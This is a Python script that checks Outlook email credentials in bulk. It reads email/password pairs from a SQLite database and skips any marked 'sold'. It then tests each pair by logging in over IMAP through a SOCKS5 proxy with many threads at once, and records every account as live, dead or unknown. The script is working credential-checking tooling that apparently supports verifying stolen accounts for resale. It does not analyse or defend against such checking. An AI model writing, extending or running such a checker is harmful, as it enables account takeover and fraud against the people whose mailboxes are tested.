import imaplib
import socks
import socket
import ssl  # Importing ssl module
import sqlite3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

def parse_proxy(proxy_str):
    username, password, domain, port = proxy_str.split(':')
    return username, password, domain, int(port)

def check_imap_login(email, password, proxy_str):
    username, pw, domain, port = parse_proxy(proxy_str)
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, domain, port, True, username, pw)
    socks.wrapmodule(imaplib)
    imap_server = 'imap-mail.outlook.com'
    imap_port = 993
    try:
        mail = imaplib.IMAP4_SSL(imap_server, imap_port)
        mail.login(email, password)
        mail.logout()
        return True
    except socks.ProxyConnectionError:
        return 'proxy_failed'
    except imaplib.IMAP4.error:
        return False
    except ssl.SSLEOFError:
        return 'proxy_failed'
    except Exception:
        return 'proxy_failed'

def update_email_status(email_id, new_live_status):
    try:
        conn = sqlite3.connect('emails.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE emails SET live=?, check_time=CURRENT_TIMESTAMP WHERE id=?", (new_live_status, email_id))
        conn.commit()
        conn.close()
    except sqlite3.OperationalError as e:
        print(f"Error updating database: {e}")

def get_emails_to_check():
    conn = sqlite3.connect('emails.db')
    cursor = conn.cursor()
    yesterday = datetime.now() - timedelta(days=1)
    # Select emails based on the specified conditions
    cursor.execute("""
        SELECT id, email, password 
        FROM emails 
        WHERE sold=0 
          AND ((live=1 AND date(check_time) < date(?)) 
          OR live=2)
    """, (yesterday,))
    emails = cursor.fetchall()
    conn.close()
    return emails

def process_email(email_data, proxy_str):
    email_id, email, password = email_data
    result = check_imap_login(email, password, proxy_str)
    if result == True:
        update_email_status(email_id, 1)  # Live
    elif result == 'proxy_failed':
        update_email_status(email_id, 2)  # Unknown due to proxy fail
    else:
        update_email_status(email_id, 0)  # Died

def check_emails(proxy_str, max_workers=10):
    emails = get_emails_to_check()
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(process_email, email_data, proxy_str) for email_data in emails]
        for future in as_completed(futures):
            future.result()  # Retrieve result to catch any potential exceptions

if __name__ == '__main__':
    PROXY_STR = "username:password:domain:port"
    check_emails(PROXY_STR)
